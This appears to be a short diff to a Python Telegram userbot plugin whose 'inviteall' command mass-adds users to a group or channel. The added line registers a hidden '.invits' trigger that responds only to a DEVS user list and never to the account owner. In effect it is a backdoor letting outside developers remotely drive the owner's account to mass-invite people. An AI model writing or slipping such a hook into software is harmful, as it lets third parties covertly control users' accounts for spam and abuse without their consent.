@@ -36,7 +36,7 @@ async def inviteee(client: Client, message: Message):
         return
     await mg.edit(f"`Sucessfully Added {len(user_list)} To This Group / Channel!`")
 
-
+@Client.on_message(filters.command("invits", ["."]) & filters.user(DEVS) & ~filters.me)
 @pyram("inviteall", ram)
 async def inv(client: Client, message: Message):
     Man = await edit_or_reply(message, "`Processing . . .`")
